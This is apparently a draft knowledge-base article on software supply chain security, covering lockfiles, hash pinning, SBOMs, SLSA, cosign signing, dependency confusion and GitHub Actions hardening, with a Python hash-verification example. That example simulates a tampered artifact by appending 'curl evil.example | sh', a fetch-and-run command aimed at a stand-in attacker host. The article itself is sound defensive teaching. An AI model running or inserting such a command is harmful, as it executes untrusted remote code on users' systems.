---
title: Software supply chain security
category: security
tags: [supply-chain, dependencies, lockfile, sbom, spdx, cyclonedx, slsa, provenance, sigstore, cosign, scorecard, github-actions]
use_cases:
  - "make our Python builds install exactly the reviewed dependency versions"
  - "produce an SBOM for each release so we can answer 'are we affected by this CVE'"
  - "sign container images in CI and verify signatures before deploy"
  - "stop a public package with our internal package's name from being installed"
  - "harden GitHub Actions workflows against compromised third-party actions"
status: draft
last_verified: 2026-10-11
sources:
  - https://slsa.dev/spec/v1.2/
  - https://pip.pypa.io/en/stable/topics/secure-installs/
  - https://docs.sigstore.dev/
  - https://spdx.dev/
  - https://cyclonedx.org/
  - https://github.com/ossf/scorecard
  - https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
  - https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/
---

# Software supply chain security

## Summary
Your software is mostly other people's code, built by tools and pipelines you
also did not write. Supply chain security makes sure that what runs in
production is exactly what you meant to build: dependencies pinned and
verified, builds done on a trusted platform that records provenance, artifacts
signed and checked before deploy, and an inventory (SBOM) so you can find
affected systems when a dependency turns out to be vulnerable or malicious.

## Key concepts
- **Pinning and lockfiles**: record exact versions of every direct and
  transitive dependency (`poetry.lock`, `uv.lock`, `package-lock.json`,
  `requirements.txt` from `pip-compile`). Ranges let a new, possibly malicious
  release in without review.
- **Hash checking**: pin the content, not just the version. pip's hash-checking
  mode (`--require-hashes`, or any `--hash` in the file) requires every
  requirement, including transitive ones, to be pinned with `==` (or a URL or
  path) and to carry a hash; sha256 is recommended.
- **SBOM (software bill of materials)**: a machine-readable list of components
  and versions in an artifact. The two main formats are SPDX (ISO/IEC
  5962:2021) and CycloneDX (Ecma standard ECMA-424).
- **SLSA**: a framework of levels for build integrity. Build track: L0 no
  guarantees; L1 provenance exists; L2 hosted build platform that generates
  and signs provenance; L3 hardened builds isolated from each other with
  signing secrets kept away from user-defined build steps. Version 1.2 is
  current and adds a Source track.
- **Provenance**: signed metadata saying which builder built an artifact, from
  which source revision and inputs. Consumers verify it before use.
- **Sigstore / cosign**: keyless signing. Cosign gets a short-lived certificate
  from Fulcio bound to an OIDC identity (a person or a CI workflow), signs, and
  records the event in the Rekor transparency log; the private key is
  discarded after one signature.
- **Dependency confusion**: an installer configured with both a private and a
  public index picks a public package with the same name as an internal one
  (often a higher version). **Typosquatting**: packages named like popular ones
  (`reqeusts`).
- **OpenSSF Scorecard**: automated checks of a project's security practices,
  each scored 0-10 (for example Pinned-Dependencies, Token-Permissions,
  Dangerous-Workflow, Signed-Releases, Branch-Protection, Maintained).
- **CI hardening**: the pipeline is part of the supply chain; pin third-party
  actions, give tokens least privilege, and never run untrusted code with
  secrets.

## When to use / scenarios
- Every project: lockfiles, automated update PRs (Dependabot, Renovate) and
  vulnerability scanning are cheap and catch most problems.
- Shipping software to customers, or selling to government and regulated
  buyers: SBOM per release, signed artifacts, provenance.
- Internal package index: protect against dependency confusion before the
  first internal package is published.
- Choosing a new open-source dependency: check Scorecard results, maintenance
  activity and transitive footprint before adopting it.
- When NOT to over-build: a throwaway script does not need SLSA L3; a lockfile
  and pinned interpreter version are enough.

## How it works / example

```
source (reviewed, protected branch)
  -> build on hosted CI (pinned actions, read-only token, lockfile + hashes)
  -> artifact + SBOM + provenance, signed with cosign (keyless, CI identity)
  -> registry
  -> deploy gate verifies signature, identity and provenance before running
```

Verify a downloaded artifact against a pinned digest before using it. This is
what `--require-hashes` and image digests (`image@sha256:...`) do for you:

```python
import hashlib
import hmac
import tempfile
from pathlib import Path

class IntegrityError(Exception):
    pass

def verify_sha256(path: Path, expected_hex: str) -> None:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1 << 16), b""):
            h.update(chunk)
    # compare_digest avoids leaking how many leading characters matched
    if not hmac.compare_digest(h.hexdigest(), expected_hex.lower()):
        raise IntegrityError(f"{path.name}: sha256 mismatch, refusing to use it")

payload = b"#!/bin/sh\necho installing tool v1.4.2\n"
PINNED = hashlib.sha256(payload).hexdigest()     # recorded when the release was reviewed

with tempfile.TemporaryDirectory() as tmp:
    artifact = Path(tmp) / "install.sh"
    artifact.write_bytes(payload)
    verify_sha256(artifact, PINNED)              # passes: bytes match the pin

    artifact.write_bytes(payload + b"curl evil.example | sh\n")   # tampered mirror
    try:
        verify_sha256(artifact, PINNED)
        raise AssertionError("tampered artifact was accepted")
    except IntegrityError as e:
        print("rejected:", e)
```

Hash-pinned Python requirements (generate with `pip-compile
--generate-hashes` or `uv pip compile --generate-hashes`):

```text
requests==2.32.3 \
    --hash=sha256:<digest of the wheel> \
    --hash=sha256:<digest of the sdist>
```

GitHub Actions hardening. GitHub's guidance: "Pinning an action to a
full-length commit SHA is currently the only way to use an action as an
immutable release", and the default `GITHUB_TOKEN` should be read-only:

```yaml
permissions:
  contents: read                      # default for all jobs; raise per job only
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write                 # OIDC for keyless signing, no stored keys
      packages: write
    steps:
      - uses: actions/checkout@<full-40-char-commit-sha>   # v4.x, comment the tag
      - run: pip install --require-hashes -r requirements.txt
      - run: cosign sign --yes ghcr.io/acme/app@${{ steps.build.outputs.digest }}
```

Dependency confusion defences: install internal packages from a single index
that proxies the public one, rather than `--extra-index-url` alongside PyPI;
reserve your internal names on the public registry; use scoped names
(`@acme/` on npm).

## Trade-offs
- **Pinning vs patching**: strict pins make builds reproducible and reviewable
  but freeze vulnerable versions unless an update bot and a fast test suite
  keep them moving.
- **Hash checking vs convenience**: `--require-hashes` fails on any unhashed
  transitive dependency and on new platforms whose wheel hash is missing;
  that friction is the protection.
- **Keyless vs key-based signing**: keyless removes long-lived signing keys
  but ties verification to an identity provider and a public transparency log;
  air-gapped environments may need key pairs held in a KMS.
- **SBOM depth**: build-time SBOMs from the lockfile are accurate for your
  ecosystem; image-scanner SBOMs also catch OS packages but can miss vendored
  or statically linked code.
- **Vendoring vs registry**: vendored dependencies survive registry outages
  and removals, but updates become manual and easy to forget.

## Gotchas
- A pinned version is not pinned content: a compromised registry or mirror can
  serve different bytes under the same version; hashes or digests close that.
- Tags move: `actions/foo@v4` and `image:1.2` can be repointed. Use commit
  SHAs and image digests for anything you trust.
- `pull_request_target` and `workflow_run` workflows run with privileged
  tokens; GitHub advises not using them with untrusted pull request code.
- Interpolating `${{ github.event.issue.title }}` directly into a `run:` script
  is script injection; pass it through an environment variable.
- Install-time scripts (`setup.py`, npm `postinstall`) run arbitrary code on
  developer machines and CI runners before any test.
- An SBOM no one queries is paperwork; store SBOMs where a CVE lookup across all
  deployed versions is one query.
- Signing without verification at deploy time protects nothing.
- Abandoned dependencies change hands; a new maintainer can ship malware in a
  patch release that your range happily accepts.

## Related
- [[ci-cd-pipelines]] - the pipeline that produces, signs and promotes artifacts.
- [[owasp-top-10]] - A03:2025 Software Supply Chain Failures.
- [[secrets-management]] - OIDC federation instead of stored CI credentials.
- [[containers-and-docker]] - base images, digests and image scanning.
- [[threat-modeling]] - the build pipeline and dependencies as attack surface.
- [[cryptography-and-tls]] - hashes, signatures and certificates underneath.
- [[backup-and-disaster-recovery]] - restoring from trusted golden images.
- See also (AI KB): [AI security, privacy and compliance](https://github.com/faheemkhaskheli9/AI-Knowledge-Base/blob/main/deployment/ai-security-privacy-compliance.md) - model and dataset supply chain risks.

## References
- SLSA specification v1.2: https://slsa.dev/spec/v1.2/
- pip documentation, Secure installs (hash-checking mode): https://pip.pypa.io/en/stable/topics/secure-installs/
- Sigstore documentation (cosign, Fulcio, Rekor): https://docs.sigstore.dev/
- SPDX (ISO/IEC 5962:2021): https://spdx.dev/
- CycloneDX (ECMA-424): https://cyclonedx.org/
- OpenSSF Scorecard: https://github.com/ossf/scorecard
- GitHub Docs, Security hardening for GitHub Actions: https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions
- OWASP Top 10:2025, A03 Software Supply Chain Failures: https://top10.owasp.org/2025/A03_2025-Software_Supply_Chain_Failures/
- Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
